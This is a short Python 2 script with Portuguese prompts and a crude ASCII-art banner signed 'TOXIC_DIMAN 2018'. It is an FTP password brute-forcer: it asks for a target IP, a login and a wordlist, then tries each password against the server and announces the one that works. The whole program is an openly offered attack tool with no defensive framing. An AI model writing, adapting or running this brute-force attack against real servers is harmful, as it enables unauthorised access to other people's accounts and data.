#!/usr/bin/python
# contacto: dimanmods1989@gmail.com 
import pygame
pygame.init()
pygame.mixer.music.load('robot.mp3')
pygame.mixer.music.play()


import ftplib

print (''' 
__________###_________
_________#___#________
_________#___#________
_________#===#________
_________#___#________
_________#___#________
_________#___#________
_________#___#________
_________#___#________
_________#___#________
_________#___#________
______####___####_____
_____#___#___#___####_
_____#___#___#___#___#
###__#___#___#___#___#
#__#_#___#___#___#___#
#___##___#___#___#___#
_#___#___#___#___#___#
__#__________________#
___#________________#_
____#______________#__
#######################
#                     #
#    TOXIC_DIMAN 2018   #
#     V: 1.0                #
#######################
 ''')

try:
	ip = str (raw_input("Digite o IP do alvo FTP: "))
	login_ftp = str (raw_input("Digite o Login do servidor FTP: "))
	wordlist = str (raw_input("Digite sua wordlist para iniciar o ataque: "))
	f = open (wordlist, "r")
	ler = f.readlines()
	for i in ler:
		try:
			servidor = ftplib.FTP(ip)
			servidor.login (login_ftp,i)
			print "[+] SENHA ENCONTRADA  PARABÉNS [+]",i
			raise SystemExit
		except ftplib.error_perm:
			print "[-] Senha Incorreta Nao Desistas [-]",i
except KeyboardInterrupt:
	print "Fim do programa"
